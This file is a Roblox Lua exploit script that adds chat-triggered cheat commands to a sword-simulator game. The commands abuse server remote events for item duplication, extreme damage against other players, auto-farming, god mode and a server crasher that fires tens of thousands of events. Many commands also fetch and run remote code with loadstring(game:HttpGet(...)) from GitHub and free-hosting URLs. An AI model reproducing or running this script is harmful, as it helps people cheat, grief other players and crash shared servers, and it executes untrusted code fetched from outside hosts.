--// 2024 fixed//--
local A_1 = "[Loaded Solex Sword Simulator Admin Commands]"-----message here
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)

local LPlayer = game.Players.LocalPlayer
LPlayer.Chatted:Connect(function(msg)
	if msg:match(";fastdupe") then
		 local number = 1
		for i = 1, 200 do
			local Player = game.Players.LocalPlayer
			for i = 1, 10 do
				local v1 = ''
				local event = game:GetService("Workspace").eff.RemoteEvent
               event:FireServer(v1)
			end
			wait(0.001)
			local event = game:GetService("Workspace").load.RemoteEvent
			event:FireServer()
			wait (0.17)
			for i, v in pairs(Player.Backpack:GetChildren()) do
				v.Parent = Player.Character
			end
			for i, v in pairs(Player.Character:GetChildren()) do
				if v:IsA('Tool') then
					v.Parent = workspace
					ex = Instance.new('Script')
					ex.Parent = v
					ex.Name = 'Mine'
				end
			end
			local Player = game.Players.LocalPlayer
			local number = 5
		end
	else
		if msg:match(";cmds") then
			wait(1)
      local A_1 = "[The admin commands, have been recently, added in the solex community, server please please go check in the server for more information.]"-----message here
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
		else
			if msg:match(";credits") then
				wait(1)
				local A_1 = "[This script was developed by Cyvex, and VoidXD.]"-----message here
				local A_2 = "All"
				local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
				Event:FireServer(A_1, A_2)
			else
			 
			 if msg:match(";sword god") then
					for ix, vx in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if vx:IsA("Tool") then
			vx.Parent = game.Players.LocalPlayer.Backpack
		end
	end
	for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		local function LRTJH_fake_script()
			local script = Instance.new('Script', v.Handle)
	
			function onTouched(part)
				local h = part.Parent:findFirstChild("Humanoid")
				if h~=nil then
					if tostring(h.Parent) ~= tostring(game.Players.LocalPlayer) then
						local v1 = h
						local v2 = -99e+400000000
						local event = game:GetService("Players").LocalPlayer.Character.sword.Handle.dmg.RemoteEvent
	
						event:FireServer(v1, v2)
					end
				end
			end
	
			script.Parent.Touched:connect(onTouched)
		end
		coroutine.wrap(LRTJH_fake_script)()
	end
			else
			 
			 if msg:match(";power view") then
	-- Gui to Lua
	-- Version: 3.2

	-- Instances:

	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local TextLabel_2 = Instance.new("TextLabel")

	--Properties:

	ScreenGui.Parent = game.CoreGui
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	Frame.Parent = ScreenGui
	Frame.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	Frame.Position = UDim2.new(0.221760795, 0, 0.35164836, 0)
	Frame.Size = UDim2.new(0, 364, 0, 267)
	Frame.Active = true
	Frame.Draggable = true

	TextLabel.Parent = Frame
	TextLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	TextLabel.Size = UDim2.new(0, 364, 0, 50)
	TextLabel.Font = Enum.Font.SourceSans
	TextLabel.Text = "Power | View"
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 14.000
	TextLabel.TextWrapped = true

	TextLabel_2.Parent = Frame
	TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_2.BackgroundTransparency = 1.000
	TextLabel_2.Position = UDim2.new(0, 0, 0.41198501, 0)
	TextLabel_2.Size = UDim2.new(0, 364, 0, 50)
	TextLabel_2.Font = Enum.Font.SourceSans
	TextLabel_2.Text = "Power:"
	TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 0)
	TextLabel_2.TextScaled = true
	TextLabel_2.TextSize = 14.000
	TextLabel_2.TextWrapped = true



	----

	while true do
		wait(0)
		TextLabel_2.Text = game.Players.LocalPlayer.leaderstats.Power.Value
	end
			else
			 
if msg:match(";farm") then
_G.farm = true

		while wait() do
			if _G.farm == true then
				for i = 1,10 do
					if game.Players.LocalPlayer.Character:FindFirstChild("sword") then
						game:GetService("Players").LocalPlayer.Character.sword.Handle.up.RemoteEvent:FireServer()
					else
						game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
					end
				end
			end
		end
	
			else
			 

if msg:match(";unfarm") then
_G.farm = false

		while wait() do
			if _G.farm == true then
				for i = 1,10 do
					if game.Players.LocalPlayer.Character:FindFirstChild("sword") then
						game:GetService("Players").LocalPlayer.Character.sword.Handle.up.RemoteEvent:FireServer()
					else
						game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
					end
				end
			end
		end
	
			else

			if msg:match(";help") then
				wait(1)
				local A_1 = "[If you need further information please join our server Solex Community, and contact the moderator or developer.]"-----message here
				local A_2 = "All"
				local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
				Event:FireServer(A_1, A_2)
			else

			if msg:match(";utg") then
				-- Codeey get's no bitchs --
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Cold2004/Own1/main/UTG.lua",true))()
			else
			
                   if msg:match(";neptune") then
				-- Neptune Sword Script
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Cold2004/Own1/main/Neptune.lua",true))()
			else

			if msg:match(";re") then
				-- Reset me
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
			else
			
			if msg:match(";afk") then
				-- Rice-Anti-Afk
             loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
			else


			if msg:match(";dmg") then
				local player = game.Players.LocalPlayer
local character = player.Character
local backpack = player.Backpack
local swords = {}
function look(dir)
    for i, v in pairs(dir:GetChildren()) do
        if(v:IsA("Tool"))then
            table.insert(swords,v)
        end
    end
end
look(backpack)
look(character)
    
for i, v in pairs(swords)do
    local sword = v
    sword.Parent = backpack
    sword.Handle.Massless = true
    sword.Handle.CanCollide = true
    sword.Parent = character
    sword.Handle.Touched:Connect(function(t)
        if(t.Parent)and(t.Parent:FindFirstChild("Humanoid"))and(t.Parent.Name~=player.Name)then
            sword.Handle.dmg.RemoteEvent:FireServer(t.Parent.Humanoid, math.huge)
        end
    end)
end
			else
			
			if msg:match(";god giver") then
				-- god
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Zacky-pixel-sketch/Hubs/main/God%20Giver", true))()
			else
			
			if msg:match(";fly") then
				-- Fly Script...
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Cold2004/Own1/main/Fly.Lua",true))()
			else

			if msg:match(";speed me 100") then
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed + 100
			else

                        if msg:match(";speed me 50") then
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed + 50
			else
			
			if msg:match(";gui") then
				loadstring(game:HttpGet(("https://raw.githubusercontent.com/icuck/Sword-Simulator-GUI/master/main.lua"), true))()
			else
			
            if msg:match(";kill all") then
				loadstring(game:HttpGet(("https://raw.githubusercontent.com/Cold2004/Own1/main/Kill%20Aura%20Paid.lua"), true))()
			else
				
			if msg:match(";fling") then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Cold2004/Own1/main/Fling%20DLL.lua",true))()
			else	
			
			if msg:match(";kick") then
			loadstring(game:HttpGet("https://avascripting.000webhostapp.com/Blacklist%20Community.lua",true))()
			else

            if msg:match(";discord") then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayripsus/Jayripsus/main/Discord/.lua",true))()
			else

                        if msg:match(";noclip") then
			nam = game.Players.LocalPlayer.Name

game:GetService('RunService').Stepped:connect(function()
for a, b in pairs(game.Workspace:GetChildren()) do
if b.Name == nam then
for i, v in pairs(game.Workspace[nam]:GetChildren()) do
if v:IsA("BasePart") then
v.CanCollide = false

end
end
end
end
end)
			else	
	
                        if msg:match(";red sword") then
			local number = 1
for i = 1, 100 do
 local Player = game.Players.LocalPlayer
for i = 1, 40 do
local v1 = 'Red'
 local event = game:GetService("Workspace").eff.RemoteEvent
event:FireServer(v1)
local event = game:GetService("Workspace").eff.RemoteEvent
event:FireServer(v1)
wait(0.001)
local event = game:GetService("Workspace").load.RemoteEvent
event:FireServer()
wait(0.17)
 for i, v in pairs(Player.Backpack:GetChildren()) do
v.Parent = Player.Character
end
for i, v in pairs(Player.Character:GetChildren()) do
if v:IsA('Tool') then
v.Parent = workspace
ex = Instance.new('Script')
ex.Parent = v
ex.Name = 'Mine'
end
end
local Player = game.Players.LocalPlayer
local number = 5
end
end
-- end of the script
			else

                        if msg:match(";black sword") then
			local number = 1
for i = 1, 100 do
 local Player = game.Players.LocalPlayer
for i = 1, 40 do
local v1 = 'Black'
 local event = game:GetService("Workspace").eff.RemoteEvent
event:FireServer(v1)
local event = game:GetService("Workspace").eff.RemoteEvent
event:FireServer(v1)
wait(0.001)
local event = game:GetService("Workspace").load.RemoteEvent
event:FireServer()
wait(0.17)
 for i, v in pairs(Player.Backpack:GetChildren()) do
v.Parent = Player.Character
end
for i, v in pairs(Player.Character:GetChildren()) do
if v:IsA('Tool') then
v.Parent = workspace
ex = Instance.new('Script')
ex.Parent = v
ex.Name = 'Mine'
end
end
local Player = game.Players.LocalPlayer
local number = 5
end
end
-- end of the script
			else	



			if msg:match(";crasher") then
				local e = 0
	for i = 1, 44100 do
		local v1 = 'Black'
		local event = game:GetService("Workspace").eff.RemoteEvent
		event:FireServer(v1)
	end
	wait(0.1)
	--create sword
	local event = game:GetService("Workspace").load.RemoteEvent
	event:FireServer()
			else
		
			    if msg:match(";effects") then
				wait(1)
				local number = 1
        for i = 1, 100 do
            local Player = game.Players.LocalPlayer
            for i = 1, 40 do
                local v1 = 'Blue'
                local event = game:GetService("Workspace").eff.RemoteEvent

                event:FireServer(v1)
            
                 local v1 = 'Red'
                local event = game:GetService("Workspace").eff.RemoteEvent

                event:FireServer(v1)
            end
            wait(0.001)
            local event = game:GetService("Workspace").load.RemoteEvent
            event:FireServer()
            wait(0.17)
            for i, v in pairs(Player.Backpack:GetChildren()) do
                v.Parent = Player.Character
            end
            for i, v in pairs(Player.Character:GetChildren()) do
                if v:IsA('Tool') then
                    v.Parent = workspace
                    ex = Instance.new('Script')
                    ex.Parent = v
                    ex.Name = 'Mine'
                end
            end
            local Player = game.Players.LocalPlayer
            local number = 5
        end
			else
			    
			    
				if msg:match(";god") then
	if game.Players.LocalPlayer.Backpack:FindFirstChild("sword") then
		game.Players.LocalPlayer.Backpack.sword.Handle.dmg.RemoteEvent:FireServer(game.Players.LocalPlayer.Character.Humanoid, - math.huge)
		wait(0.4)
	else
		game.Players.LocalPlayer.Character:FindFirstChild("sword").Handle.dmg.RemoteEvent:FireServer(game.Players.LocalPlayer.Character.Humanoid, - math.huge)
	end
	while wait() do
		game.Players.LocalPlayer.Character.Humanoid.Health = "-nan(ind)"
		game.Players.LocalPlayer.Character.pvp:Destroy()
	end
				else
					if msg:match(";rj") then
						local ts = game:GetService("TeleportService")

						local p = game:GetService("Players").LocalPlayer



						ts:Teleport(game.PlaceId, p)
	    				end
    
				    end
			    end
		    end
	    end
	end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end)
